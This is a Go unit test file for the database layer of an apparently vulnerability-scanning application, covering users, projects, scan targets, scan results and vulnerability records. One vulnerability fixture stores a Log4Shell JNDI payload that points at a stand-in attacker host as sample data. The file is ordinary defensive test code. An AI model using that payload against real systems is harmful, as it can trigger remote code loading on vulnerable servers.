package dao

import (
	"os"
	"testing"
	"time"
	"cyberedge/pkg/models"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gorm.io/driver/mysql"
	"gorm.io/gorm"
)

// 创建MySQL测试数据库连接
func setupTestDB(t *testing.T) *gorm.DB {
	// 从环境变量获取MySQL DSN，如果没有则使用默认测试配置
	dsn := os.Getenv("MYSQL_DSN")
	if dsn == "" {
		dsn = "root:password@tcp(localhost:3306)/cyberedge_test?charset=utf8mb4&parseTime=True&loc=Local"
	}

	db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
	require.NoError(t, err)

	// 自动迁移表结构
	err = db.AutoMigrate(
		&models.User{},
		&models.ProjectOptimized{},
		&models.ScanTarget{},
		&models.ScanResultOptimized{},
		&models.VulnerabilityOptimized{},
		&models.WebPathOptimized{},
		&models.TechnologyOptimized{},
		&models.ScanResultTechnology{},
		&models.ScanFrameworkResult{},
		&models.ScanFrameworkTarget{},
	)
	require.NoError(t, err)

	return db
}

// 测试用户DAO
func TestUserDAO(t *testing.T) {
	db := setupTestDB(t)
	userDAO := NewUserDAO(db)

	// 清理之前的测试数据
	db.Where("username IN ('testuser', 'updatetest', 'deletetest', 'duplicate', 'email_dup1', 'email_dup2')").Delete(&models.User{})
	db.Where("email IN ('test@example.com', 'updated@example.com', 'dup1@example.com', 'dup2@example.com', 'duplicate@example.com')").Delete(&models.User{})

	t.Run("Create user", func(t *testing.T) {
		user := &models.User{
			Username:     "testuser",
			Email:        "test@example.com",
			PasswordHash: "hashed_password",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		err := userDAO.Create(user)
		assert.NoError(t, err)
		assert.NotZero(t, user.ID)
	})

	t.Run("Get user by username", func(t *testing.T) {
		// 先创建用户
		user := &models.User{
			Username:     "gettest",
			Email:        "gettest@example.com",
			PasswordHash: "hashed_password",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}
		err := userDAO.Create(user)
		require.NoError(t, err)

		// 获取用户
		foundUser, err := userDAO.GetByUsername("gettest")
		assert.NoError(t, err)
		assert.Equal(t, "gettest", foundUser.Username)
		assert.Equal(t, "gettest@example.com", foundUser.Email)
	})

	t.Run("Get user by email", func(t *testing.T) {
		// 先创建用户
		user := &models.User{
			Username:     "emailtest",
			Email:        "emailtest@example.com",
			PasswordHash: "hashed_password",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}
		err := userDAO.Create(user)
		require.NoError(t, err)

		// 通过邮箱获取用户
		foundUser, err := userDAO.GetByEmail("emailtest@example.com")
		assert.NoError(t, err)
		assert.Equal(t, "emailtest", foundUser.Username)
		assert.Equal(t, "emailtest@example.com", foundUser.Email)
	})

	t.Run("Get all users", func(t *testing.T) {
		// 创建多个用户
		users := []*models.User{
			{Username: "user1", Email: "user1@test.com", PasswordHash: "hash1", Role: "user", CreatedAt: time.Now().Unix(), UpdatedAt: time.Now().Unix()},
			{Username: "user2", Email: "user2@test.com", PasswordHash: "hash2", Role: "admin", CreatedAt: time.Now().Unix(), UpdatedAt: time.Now().Unix()},
		}

		for _, user := range users {
			err := userDAO.Create(user)
			require.NoError(t, err)
		}

		// 获取所有用户
		allUsers, err := userDAO.GetAll()
		assert.NoError(t, err)
		assert.GreaterOrEqual(t, len(allUsers), 2)
	})

	t.Run("Update user", func(t *testing.T) {
		// 创建用户
		user := &models.User{
			Username:     "updatetest",
			Email:        "updatetest@example.com",
			PasswordHash: "old_hash",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}
		err := userDAO.Create(user)
		require.NoError(t, err)

		// 更新用户
		user.PasswordHash = "new_hash"
		user.Role = "admin"
		err = userDAO.Update(user)
		assert.NoError(t, err)

		// 验证更新
		updatedUser, err := userDAO.GetByUsername("updatetest")
		assert.NoError(t, err)
		assert.Equal(t, "new_hash", updatedUser.PasswordHash)
		assert.Equal(t, "admin", updatedUser.Role)
	})

	t.Run("Delete user", func(t *testing.T) {
		// 创建用户
		user := &models.User{
			Username:     "deletetest",
			Email:        "deletetest@example.com",
			PasswordHash: "hash",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}
		err := userDAO.Create(user)
		require.NoError(t, err)

		// 删除用户
		err = userDAO.Delete(user.ID)
		assert.NoError(t, err)

		// 验证删除
		_, err = userDAO.GetByUsername("deletetest")
		assert.Error(t, err) // 应该找不到用户
	})

	t.Run("Handle duplicate username", func(t *testing.T) {
		user1 := &models.User{
			Username:     "duplicate",
			Email:        "dup1@example.com",
			PasswordHash: "hash1",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		user2 := &models.User{
			Username:     "duplicate", // 重复用户名
			Email:        "dup2@example.com",
			PasswordHash: "hash2",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		// 第一个用户应该成功
		err := userDAO.Create(user1)
		assert.NoError(t, err)

		// 第二个用户应该失败（重复用户名）
		err = userDAO.Create(user2)
		assert.Error(t, err)
	})

	t.Run("Handle duplicate email", func(t *testing.T) {
		user1 := &models.User{
			Username:     "email_dup1",
			Email:        "duplicate@example.com",
			PasswordHash: "hash1",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		user2 := &models.User{
			Username:     "email_dup2",
			Email:        "duplicate@example.com", // 重复邮箱
			PasswordHash: "hash2",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		// 第一个用户应该成功
		err := userDAO.Create(user1)
		assert.NoError(t, err)

		// 第二个用户应该失败（重复邮箱）
		err = userDAO.Create(user2)
		assert.Error(t, err)
	})
}

// 测试项目DAO（基础功能测试）
func TestProjectDAO(t *testing.T) {
	db := setupTestDB(t)

	// 清理之前的测试数据
	db.Where("name IN ('Test Project', 'Unique Project')").Delete(&models.ProjectOptimized{})

	t.Run("Create and retrieve project", func(t *testing.T) {
		project := &models.ProjectOptimized{
			Name:        "Test Project",
			Description: "A test project for unit testing",
			CreatedAt:   time.Now(),
			UpdatedAt:   time.Now(),
		}

		// 创建项目
		result := db.Create(project)
		assert.NoError(t, result.Error)
		assert.NotZero(t, project.ID)

		// 检索项目
		var retrievedProject models.ProjectOptimized
		result = db.First(&retrievedProject, project.ID)
		assert.NoError(t, result.Error)
		assert.Equal(t, project.Name, retrievedProject.Name)
		assert.Equal(t, project.Description, retrievedProject.Description)
	})

	t.Run("Project name uniqueness", func(t *testing.T) {
		project1 := &models.ProjectOptimized{
			Name:        "Unique Project",
			Description: "First project",
			CreatedAt:   time.Now(),
			UpdatedAt:   time.Now(),
		}

		project2 := &models.ProjectOptimized{
			Name:        "Unique Project", // 重复项目名
			Description: "Second project",
			CreatedAt:   time.Now(),
			UpdatedAt:   time.Now(),
		}

		// 第一个项目应该成功
		result := db.Create(project1)
		assert.NoError(t, result.Error)

		// 第二个项目应该失败（重复项目名）
		result = db.Create(project2)
		assert.Error(t, result.Error)
	})
}

// 测试扫描目标DAO
func TestScanTargetDAO(t *testing.T) {
	db := setupTestDB(t)

	// 先创建一个项目
	project := &models.ProjectOptimized{
		Name:        "Scan Test Project",
		Description: "Project for testing scan targets",
		CreatedAt:   time.Now(),
		UpdatedAt:   time.Now(),
	}
	result := db.Create(project)
	require.NoError(t, result.Error)

	t.Run("Create and retrieve scan target", func(t *testing.T) {
		target := &models.ScanTarget{
			ProjectID: project.ID,
			Type:      "domain",
			Address:   "example.com",
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		// 创建扫描目标
		result := db.Create(target)
		assert.NoError(t, result.Error)
		assert.NotZero(t, target.ID)

		// 检索扫描目标
		var retrievedTarget models.ScanTarget
		result = db.First(&retrievedTarget, target.ID)
		assert.NoError(t, result.Error)
		assert.Equal(t, target.Address, retrievedTarget.Address)
		assert.Equal(t, target.Type, retrievedTarget.Type)
	})

	t.Run("Hierarchical scan targets", func(t *testing.T) {
		// 创建父目标
		parentTarget := &models.ScanTarget{
			ProjectID: project.ID,
			Type:      "domain",
			Address:   "parent.com",
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}
		result := db.Create(parentTarget)
		require.NoError(t, result.Error)

		// 创建子目标
		childTarget := &models.ScanTarget{
			ProjectID: project.ID,
			Type:      "subdomain",
			Address:   "sub.parent.com",
			ParentID:  &parentTarget.ID,
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}
		result = db.Create(childTarget)
		assert.NoError(t, result.Error)

		// 验证层级关系
		var retrievedChild models.ScanTarget
		result = db.Preload("Parent").First(&retrievedChild, childTarget.ID)
		assert.NoError(t, result.Error)
		assert.NotNil(t, retrievedChild.Parent)
		assert.Equal(t, parentTarget.Address, retrievedChild.Parent.Address)
		assert.False(t, retrievedChild.IsRoot())
		assert.True(t, parentTarget.IsRoot())
	})
}

// 测试扫描结果DAO
func TestScanResultDAO(t *testing.T) {
	db := setupTestDB(t)

	// 清理之前的测试数据
	db.Where("project_id > 0").Delete(&models.ScanResultOptimized{})
	db.Where("name LIKE '%Test%'").Delete(&models.ProjectOptimized{})
	db.Where("address LIKE '%test%'").Delete(&models.ScanTarget{})

	// 设置测试数据
	project := &models.ProjectOptimized{
		Name: "Result Test Project", CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}
	db.Create(project)

	target := &models.ScanTarget{
		ProjectID: project.ID, Type: "domain", Address: "test.com",
		CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}
	db.Create(target)

	t.Run("Create and retrieve scan result", func(t *testing.T) {
		scanResult := &models.ScanResultOptimized{
			ProjectID:    project.ID,
			TargetID:     target.ID,
			Port:         80,
			Protocol:     "tcp",
			State:        "open",
			ServiceName:  "http",
			Version:      "nginx/1.20.1",
			IsWebService: true,
			HTTPStatus:   200,
			HTTPTitle:    "Welcome Page",
			CreatedAt:    time.Now(),
			UpdatedAt:    time.Now(),
		}

		result := db.Create(scanResult)
		assert.NoError(t, result.Error)
		assert.NotZero(t, scanResult.ID)

		// 验证字段
		var retrieved models.ScanResultOptimized
		result = db.First(&retrieved, scanResult.ID)
		assert.NoError(t, result.Error)
		assert.Equal(t, 80, retrieved.Port)
		assert.Equal(t, "tcp", retrieved.Protocol)
		assert.Equal(t, "open", retrieved.State)
		assert.Equal(t, "http", retrieved.ServiceName)
		assert.True(t, retrieved.IsWebService)
		assert.Equal(t, "http/nginx/1.20.1", retrieved.GetServiceSignature())
	})

	t.Run("Unique constraint on target/port/protocol", func(t *testing.T) {
		result1 := &models.ScanResultOptimized{
			ProjectID: project.ID, TargetID: target.ID, Port: 443, Protocol: "tcp",
			State: "open", ServiceName: "https", CreatedAt: time.Now(), UpdatedAt: time.Now(),
		}

		result2 := &models.ScanResultOptimized{
			ProjectID: project.ID, TargetID: target.ID, Port: 443, Protocol: "tcp", // 重复
			State: "open", ServiceName: "https", CreatedAt: time.Now(), UpdatedAt: time.Now(),
		}

		// 第一个结果应该成功
		dbResult := db.Create(result1)
		assert.NoError(t, dbResult.Error)

		// 第二个结果应该失败（重复的target/port/protocol组合）
		dbResult = db.Create(result2)
		assert.Error(t, dbResult.Error)
	})
}

// 测试漏洞DAO
func TestVulnerabilityDAO(t *testing.T) {
	db := setupTestDB(t)

	// 清理之前的测试数据
	db.Where("scan_result_id > 0").Delete(&models.VulnerabilityOptimized{})
	db.Where("project_id > 0").Delete(&models.ScanResultOptimized{})
	db.Where("name LIKE '%Vuln%'").Delete(&models.ProjectOptimized{})
	db.Where("address LIKE '%vuln%'").Delete(&models.ScanTarget{})

	// 设置测试数据
	project := &models.ProjectOptimized{Name: "Vuln Test", CreatedAt: time.Now(), UpdatedAt: time.Now()}
	db.Create(project)

	target := &models.ScanTarget{
		ProjectID: project.ID, Type: "domain", Address: "vuln.test.com",
		CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}
	db.Create(target)

	scanResult := &models.ScanResultOptimized{
		ProjectID: project.ID, TargetID: target.ID, Port: 80, Protocol: "tcp",
		State: "open", ServiceName: "http", CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}
	db.Create(scanResult)

	t.Run("Create and retrieve vulnerability", func(t *testing.T) {
		vuln := &models.VulnerabilityOptimized{
			ScanResultID: scanResult.ID,
			CVEID:        "CVE-2021-44228",
			Title:        "Apache Log4j2 Remote Code Execution Vulnerability",
			Description:  "Apache Log4j2 <=2.14.1 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
			Severity:     "critical",
			CVSS:         10.0,
			Location:     "/api/login",
			Parameter:    "username",
			Payload:      "${jndi:ldap://attacker.com/a}",
			Status:       "open",
			CreatedAt:    time.Now(),
			UpdatedAt:    time.Now(),
		}

		result := db.Create(vuln)
		assert.NoError(t, result.Error)
		assert.NotZero(t, vuln.ID)

		// 验证字段和方法
		var retrieved models.VulnerabilityOptimized
		result = db.First(&retrieved, vuln.ID)
		assert.NoError(t, result.Error)
		assert.Equal(t, "CVE-2021-44228", retrieved.CVEID)
		assert.Equal(t, "critical", retrieved.Severity)
		assert.Equal(t, 10.0, retrieved.CVSS)
		assert.True(t, retrieved.IsCritical())
		assert.True(t, retrieved.IsOpen())
	})

	t.Run("Vulnerability severity levels", func(t *testing.T) {
		severities := []struct {
			level    string
			cvss     float64
			critical bool
		}{
			{"critical", 9.5, true},
			{"high", 7.8, false},
			{"medium", 5.2, false},
			{"low", 2.1, false},
			{"info", 0.0, false},
		}

		for _, sev := range severities {
			vuln := &models.VulnerabilityOptimized{
				ScanResultID: scanResult.ID,
				Title:        "Test Vuln " + sev.level,
				Severity:     sev.level,
				CVSS:         sev.cvss,
				Status:       "open",
				CreatedAt:    time.Now(),
				UpdatedAt:    time.Now(),
			}

			result := db.Create(vuln)
			assert.NoError(t, result.Error)
			assert.Equal(t, sev.critical, vuln.IsCritical())
		}
	})
}